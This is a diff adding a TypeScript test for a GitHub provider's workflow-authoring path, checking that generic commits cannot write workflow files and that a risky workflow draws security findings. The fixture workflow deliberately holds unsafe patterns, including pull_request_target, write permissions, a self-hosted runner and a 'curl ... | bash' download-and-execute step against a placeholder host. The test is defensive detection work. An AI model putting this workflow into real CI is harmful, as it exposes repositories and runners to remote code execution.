@@ -640,6 +640,84 @@ test('GitHub provider returns exact PR identity plus checks and workflow runs', 
 });
 
 
+test('GitHub workflow authoring requires the dedicated lane, proves workflow permission, and returns review findings', async () => {
+  const headSha = 'a'.repeat(40);
+  const createdSha = 'e'.repeat(40);
+  const requestedPermissions: Array<Record<string, 'read' | 'write'>> = [];
+  const provider = new GitHubRuntimeProvider({
+    credentials: {
+      async getIdentity() { return { kind: 'app' as const, appId: '12345' }; },
+      async getCredential(repository: string) {
+        requestedPermissions.push({});
+        return {
+          token: 'installation-token',
+          kind: 'app-installation' as const,
+          identity: { kind: 'app' as const, appId: '12345', installationId: 42 },
+          repository,
+          permissions: { contents: 'write', workflows: 'write', pull_requests: 'write' },
+        };
+      },
+    },
+    allowedOwners: ['pyralisxc'],
+    fetch: async (input, init) => {
+      const url = new URL(String(input));
+      const method = init?.method ?? 'GET';
+      if (url.pathname.endsWith('/git/ref/heads/work/173-actions') && method === 'GET') return Response.json({ object: { sha: headSha } });
+      if (url.pathname.endsWith(`/git/commits/${headSha}`) && method === 'GET') return Response.json({ tree: { sha: 'b'.repeat(40) } });
+      if (url.pathname.endsWith('/git/blobs') && method === 'POST') return Response.json({ sha: 'c'.repeat(40) });
+      if (url.pathname.endsWith('/git/trees') && method === 'POST') return Response.json({ sha: 'd'.repeat(40) });
+      if (url.pathname.endsWith('/git/commits') && method === 'POST') return Response.json({ sha: createdSha });
+      if (url.pathname.endsWith('/git/refs/heads/work/173-actions') && method === 'PATCH') return Response.json({ object: { sha: createdSha } });
+      throw new Error(`Unexpected request ${method} ${url.pathname}`);
+    },
+  });
+  const project = { id: 'Conductor', repository: 'pyralisxc/Conductor' };
+
+  await assert.rejects(
+    provider.createCommit({
+      project,
+      branch: 'work/173-actions',
+      expectedHeadSha: headSha,
+      message: 'attempt generic workflow write',
+      files: [{ path: '.github/workflows/unsafe.yml', content: 'name: unsafe' }],
+      idempotencyKey: 'generic-workflow-refused',
+    }),
+    (error: unknown) => (error as { code?: string }).code === 'PERMISSION_DENIED',
+  );
+
+  const result = await provider.createWorkflowCommit({
+    project,
+    branch: 'work/173-actions',
+    expectedHeadSha: headSha,
+    message: 'ci: add bounded workflow',
+    path: '.github/workflows/bounded.yml',
+    content: `name: Bounded
+on: [pull_request_target]
+permissions:
+  contents: write
+jobs:
+  test:
+    runs-on: self-hosted
+    environment: production
+    steps:
+      - uses: third-party/example@v1
+      - run: curl https://example.invalid/install.sh | bash
+`,
+    idempotencyKey: 'workflow-authoring-test',
+  });
+  assert.equal(result.commitSha, createdSha);
+  assert.equal(result.path, '.github/workflows/bounded.yml');
+  assert.deepEqual(result.permissionSummary.required, ['contents:write', 'workflows:write']);
+  assert.equal(result.permissionSummary.declaredPermissions, true);
+  assert.equal(result.findings.some((finding) => finding.code === 'pull-request-target' && finding.severity === 'high'), true);
+  assert.equal(result.findings.some((finding) => finding.code === 'write-permission'), true);
+  assert.equal(result.findings.some((finding) => finding.code === 'self-hosted-runner'), true);
+  assert.equal(result.findings.some((finding) => finding.code === 'external-action'), true);
+  assert.equal(result.findings.some((finding) => finding.code === 'download-execute'), true);
+  assert.equal(result.findings.some((finding) => finding.code === 'environment-access'), true);
+  assert.ok(requestedPermissions.length >= 2);
+});
+
 test('GitHub work-item candidate expansion bounds PR reads and skips settled merged verification evidence', async () => {
   const issueNumber = 55;
   const pullNumbers = [101, 102, 103, 104, 105, 106];
